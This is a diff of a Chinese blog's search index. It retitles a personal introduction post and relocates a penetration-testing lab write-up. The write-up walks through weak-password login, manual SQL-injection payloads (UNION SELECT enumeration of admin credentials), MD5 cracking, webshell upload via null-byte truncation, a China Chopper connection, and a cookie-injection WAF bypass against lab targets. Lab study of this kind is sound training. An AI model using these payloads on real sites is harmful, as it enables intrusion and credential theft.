@@ -121,19 +121,17 @@
 ]]></content>
   </entry>
   <entry>
-    <title>杂乱的思考</title>
+    <title>起始篇</title>
     <url>/2023/10/14/Hello-My-Blog/</url>
-    <content><![CDATA[<p>消失不见好久的勇气，今天意外出现了…</p>
-<h1 id="About-this-Blog：What→Why→How"><a href="#About-this-Blog：What→Why→How" class="headerlink" title="About this Blog：What→Why→How"></a>About this Blog：What→Why→How</h1><ul>
+    <content><![CDATA[<h1 id="About-this-Blog：What→Why→How"><a href="#About-this-Blog：What→Why→How" class="headerlink" title="About this Blog：What→Why→How"></a>About this Blog：What→Why→How</h1><ul>
 <li>想要创建博客记录一下我的Computer Science学习过程 &amp; 一些生活和学习工作的想法 ~（srds有点建晚了，大一就该准备好的呜呜呜Q﹏Q（不过还不算太迟</li>
 <li>超严重的强迫症，这些事情写到纸上如果格式之类出问题 or 字写得丑了点，立马就会忍不住撕掉重写（所以Blog+markdown对我来说是好选择，可以多次反复利用）之前为了治这个毛病，特意买了Daycrafts的日程本试图用昂贵的纸张唤醒我节约的意识，结果完美证明：我的强迫症 &gt; 我对银子的心疼😥。总之，Hello My Blog！新的计划开始了~</li>
 <li>初定一个小目标，今年每周至少写2篇技术记录！flag已经立好，开始实现！🥳</li>
 </ul>
-<h2 id="About-me🫧"><a href="#About-me🫧" class="headerlink" title="About me🫧"></a>About me🫧</h2><p>一个似有所悟的人，让时间介绍自己。</p>
-<h2 id="消失不见好久的勇气…🫧"><a href="#消失不见好久的勇气…🫧" class="headerlink" title="消失不见好久的勇气…🫧"></a>消失不见好久的勇气…🫧</h2><p>普通家庭出身的大部分人所习惯的模式是竞争与服从，他们周围的环境，甚至他们自己的内心，都好像缺了一些东西——那种真正能让人投身于某个领域的使命感、梦想与可以使用的方法论，我叫它“意识”。</p>
+<h2 id="勇气🎞️"><a href="#勇气🎞️" class="headerlink" title="勇气🎞️"></a>勇气🎞️</h2><p>普通家庭出身的大部分人所习惯的模式是竞争与服从，他们周围的环境，甚至他们自己的内心，都好像缺了一些东西——那种真正能让人投身于某个领域的使命感、梦想与可以使用的方法论，我叫它“意识”。</p>
 <p>成绩、量化一个人的考核标准，在我更加年轻的时候给了我很多满足——因为我经常在这种“竞争”游戏中胜出。可惜意识不足的个体不会在真正意义上踏上“上行之路”，心态也像地基没有扎稳的房子，摇摇欲坠，不会挺立太久。之后很长一段时间我所面对的，是认知与期望产生巨大落差的挫败，以及明知自己难以迅速填补沟壑、想要得到一些事物就要付出超常的努力，却迟迟驻足原处、不知该走向何处的犹疑。</p>
 <p>这种情况在我进入大学之后改善了非常之多，但“改善”还远远不够。这个博客存在的意义就在于，我将在这里记录自己走向有计划且愿意为计划付出全部的未来</p>
-<h2 id="勇气🫧"><a href="#勇气🫧" class="headerlink" title="勇气🫧"></a>勇气🫧</h2><p>今天一个寻常的上午，我在寝室一边听歌一边整理、清洗自己的东西。整理东西总是让我有一种整理自己内心的感受——一切都在归位的感觉。前几周的那种紧迫与内心的焦急如潮水褪去。东想西想的时候，我突然心生出一个疑问 “我之前的勇气都到哪里去了？那个本来年轻又有抱负的家伙，怎么现在才有发声的？”</p>
+<h2 id="感悟🌠"><a href="#感悟🌠" class="headerlink" title="感悟🌠"></a>感悟🌠</h2><p>今天一个寻常的上午，我在寝室一边听歌一边整理、清洗自己的东西。整理东西总是让我有一种整理自己内心的感受——一切都在归位的感觉。前几周的那种紧迫与内心的焦急如潮水褪去。东想西想的时候，我突然心生出一个疑问 “我之前的勇气都到哪里去了？那个本来年轻又有抱负的家伙，怎么现在才有发声的？”</p>
 <p>很神奇，甚至看似都没有任何诱发条件，我突然觉得浑身充满了力量，急切地想要去做我计划的事情。勇气回来之后、写博客之前，也没有浪费时间：认真对待我的生活，不去过度解读一些可能诱发不快的事情，坚定地朝向自己的小目标走去并且完成它。</p>
 <p>这对我来说，这种对秩序的追求，这种像渴望呼吸一般进步的欲望，真的非常重要。</p>
 <p>勇气回来了。内心的激动与明朗难以言喻。我只想要在之后的时间里，一遍遍验证这个事实，想办法让它留下来，不再离开。</p>
@@ -149,6 +147,9 @@
 <p>Whether sixty or sixteen, there is in every human being’s heart the lure of wonders, the unfailing childlike appetite of what’s next and the joy of the game of living. In the centre of your heart and my heart there is a wireless station: so long as it receives messages of beauty, hope, cheer, courage and power from men and from the infinite, so long are you young.</p>
 <p>When the aerials are down, and your spirit is covered with snows of cynicism and the ice of pessimism, then you are grown old, even at twenty, but as long as your aerials are up, to catch waves of optimism, there is hope you may die young at eighty.</p>
 ]]></content>
+      <tags>
+        <tag>level</tag>
+      </tags>
   </entry>
   <entry>
     <title>w1r3s靶场</title>
@@ -292,147 +293,8 @@
 <img data-src="/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8736.png" class title="This is an test image"> 
 ]]></content>
       <tags>
-        <tag>Web</tag>
+        <tag>Web-渗透测试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>其他靶场+封神台</title>
-    <url>/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<p><strong>shop靶场</strong></p>
-<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
-<p>首先，打开虚拟机：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps1.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps2.jpg" alt="img"></p>
-<p>然后双击打开shop1:</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps3.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps4.jpg" alt="img"></p>
-<p>再次双击</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps5.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps6.jpg" alt="img"></p>
-<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps7.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps8.png" alt="img"></p>
-<p>点击关闭:</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps9.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps10.png" alt="img"></p>
-<p>现在再点击就能打开了，如图：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps11.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps12.png" alt="img"></p>
-<p>点击第一行：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps13.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps14.png" alt="img"></p>
-<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps15.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps16.png" alt="img"></p>
-<p>先来试试弱密码：账号：admin 密码：admin</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps17.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps18.png" alt="img"></p>
-<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps19.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps20.jpg" alt="img"></p>
-<p>接下来来试一下加强了难度的shop2:</p>
-<p>打开过程和第一个一样，我就不赘述了。</p>
-<p> 我们要进入后台先要找到后台登录页面，我开始时用御剑扫描，但是一直没扫到，用wwwscan扫描时不知出了什么问题，也没扫出来。幸运的是，机缘巧合之下发现了网站的后台：</p>
-<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
-<p>我们跳转到网页后台登录页面：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps21.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps22.png" alt="img"></p>
-<p>试一试之前试过的弱密码，失败了：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps23.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps24.png" alt="img"></p>
-<p>那怎么办呢？接下来，我们进行sql注入，打开阿D注入工具</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps25.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps26.jpg" alt="img"></p>
-<p>将注入链接里面的IP地址改成我们现在的地址，点击检测：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps27.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps28.jpg" alt="img"></p>
-<p>点击检测标段，再点击admin</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps29.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps30.jpg" alt="img"></p>
-<p>点击检测字段，再把password和admin勾选上：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps31.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps32.jpg" alt="img"></p>
-<p>点击检测内容：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps33.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps34.jpg" alt="img"></p>
-<p>结果出现两组账号密码，我们任选其中一组就行：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps35.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps36.jpg" alt="img"></p>
-<p>在这里，我选择了上面一种，双击，出现账号和密码：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps37.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png" alt="img"></p>
-<p>我们发现密码好像被MD5加密过了，于是，我们解密一下：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps39.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps40.jpg" alt="img"></p>
-<p>用获取的账号和密码进行登录：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps41.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps42.png" alt="img"></p>
-<p>成功登录：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps43.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps44.jpg" alt="img"></p>
-<p>上传木马:</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps45.jpg" alt="img"> </p>
-<p>文件上传成功：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps46.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps47.jpg" alt="img"> </p>
-<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps48.jpg" alt="img"> </p>
-<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps49.jpg" alt="img"> </p>
-<p>打开菜刀，将木马路径输入进去</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps50.jpg" alt="img"> </p>
-<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps51.jpg" alt="img"></p>
-<p>3.尤里的复仇1 sql注入</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps52.jpg" alt="img"> </p>
-<p>一、判断是否存在SQL注入漏洞:</p>
-<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps53.jpg" alt="img"> </p>
-<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
-<p>2.构造 and 1&#x3D;2</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps54.jpg" alt="img"> </p>
-<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
-<p>二、判断字段数</p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps55.jpg" alt="img"> </p>
-<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps56.jpg" alt="img"> </p>
-<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps57.jpg" alt="img"> </p>
-<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
-<p>三、判断回显点</p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps58.jpg" alt="img"> </p>
-<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
-<p>四、查询相关内容</p>
-<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps59.jpg" alt="img"> </p>
-<p>页面回显maoshe</p>
-<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps60.jpg" alt="img"> </p>
-<p>回显版本号为5.5.53</p>
-<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps61.jpg" alt="img"> </p>
-<p>页面回显admin</p>
-<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
-<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps62.jpg" alt="img"> </p>
-<p>回显字段名为id</p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps63.jpg" alt="img"> </p>
-<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps64.jpg" alt="img"> </p>
-<p>回显password</p>
-<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps65.jpg" alt="img"> </p>
-<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
-<p>顺利得到flag</p>
-<ol start="4">
-<li>尤里的复仇2 信息收集1</li>
-</ol>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps66.jpg" alt="img"> </p>
-<p>用御剑进行扫描，flag在二级目录里</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps67.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps68.jpg" alt="img"> </p>
-<p>点击链接，得到flag</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps69.jpg" alt="img"> </p>
-<p>5.尤里的复仇 绕过WAF</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps70.jpg" alt="img"> </p>
-<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入。</p>
-<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字。</p>
-<p>因为网页做了waf过滤防护，这里我们考虑用cookie注入，可以进行绕过：</p>
-<p>这里我们使用一个小工具进行注入</p>
-<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps71.jpg" alt="img"> </p>
-<p>出现账号和密码：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps72.jpg" alt="img"> </p>
-<p>将密码md5解密：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps73.jpg" alt="img"> </p>
-<p>用御剑进行扫描，获得后台地址：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps74.jpg" alt="img"> </p>
-<p>输入之前获得的用户名和密码：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps75.jpg" alt="img"> </p>
-<p>成功拿到flag:</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps76.jpg" alt="img"> </p>
-]]></content>
   </entry>
   <entry>
     <title>红日靶场</title>
@@ -594,6 +456,145 @@
 <p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps178.jpg" alt="img"> </p>
 <p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
 <p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps179.jpg" alt="img"> </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>其他靶场+封神台</title>
+    <url>/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<p><strong>shop靶场</strong></p>
+<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
+<p>首先，打开虚拟机：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps1.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps2.jpg" alt="img"></p>
+<p>然后双击打开shop1:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps3.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps4.jpg" alt="img"></p>
+<p>再次双击</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps5.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps6.jpg" alt="img"></p>
+<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps7.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps8.png" alt="img"></p>
+<p>点击关闭:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps9.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps10.png" alt="img"></p>
+<p>现在再点击就能打开了，如图：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps11.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps12.png" alt="img"></p>
+<p>点击第一行：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps13.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps14.png" alt="img"></p>
+<p>输入网站后台的地址：<a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps15.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps16.png" alt="img"></p>
+<p>先来试试弱密码：账号：admin 密码：admin</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps17.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps18.png" alt="img"></p>
+<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps19.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps20.jpg" alt="img"></p>
+<p>接下来来试一下加强了难度的shop2:</p>
+<p>打开过程和第一个一样，我就不赘述了。</p>
+<p> 我们要进入后台先要找到后台登录页面，我开始时用御剑扫描，但是一直没扫到，用wwwscan扫描时不知出了什么问题，也没扫出来。幸运的是，机缘巧合之下发现了网站的后台：</p>
+<p><a href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
+<p>我们跳转到网页后台登录页面：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps21.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps22.png" alt="img"></p>
+<p>试一试之前试过的弱密码，失败了：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps23.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps24.png" alt="img"></p>
+<p>那怎么办呢？接下来，我们进行sql注入，打开阿D注入工具</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps25.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps26.jpg" alt="img"></p>
+<p>将注入链接里面的IP地址改成我们现在的地址，点击检测：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps27.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps28.jpg" alt="img"></p>
+<p>点击检测标段，再点击admin</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps29.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps30.jpg" alt="img"></p>
+<p>点击检测字段，再把password和admin勾选上：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps31.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps32.jpg" alt="img"></p>
+<p>点击检测内容：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps33.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps34.jpg" alt="img"></p>
+<p>结果出现两组账号密码，我们任选其中一组就行：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps35.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps36.jpg" alt="img"></p>
+<p>在这里，我选择了上面一种，双击，出现账号和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps37.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png" alt="img"></p>
+<p>我们发现密码好像被MD5加密过了，于是，我们解密一下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps39.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps40.jpg" alt="img"></p>
+<p>用获取的账号和密码进行登录：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps41.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps42.png" alt="img"></p>
+<p>成功登录：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps43.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps44.jpg" alt="img"></p>
+<p>上传木马:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps45.jpg" alt="img"> </p>
+<p>文件上传成功：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps46.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps47.jpg" alt="img"> </p>
+<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps48.jpg" alt="img"> </p>
+<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps49.jpg" alt="img"> </p>
+<p>打开菜刀，将木马路径输入进去</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps50.jpg" alt="img"> </p>
+<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps51.jpg" alt="img"></p>
+<p>3.尤里的复仇1 sql注入</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps52.jpg" alt="img"> </p>
+<p>一、判断是否存在SQL注入漏洞:</p>
+<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps53.jpg" alt="img"> </p>
+<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
+<p>2.构造 and 1&#x3D;2</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps54.jpg" alt="img"> </p>
+<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
+<p>二、判断字段数</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps55.jpg" alt="img"> </p>
+<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps56.jpg" alt="img"> </p>
+<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps57.jpg" alt="img"> </p>
+<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
+<p>三、判断回显点</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps58.jpg" alt="img"> </p>
+<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
+<p>四、查询相关内容</p>
+<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps59.jpg" alt="img"> </p>
+<p>页面回显maoshe</p>
+<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps60.jpg" alt="img"> </p>
+<p>回显版本号为5.5.53</p>
+<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps61.jpg" alt="img"> </p>
+<p>页面回显admin</p>
+<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
+<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps62.jpg" alt="img"> </p>
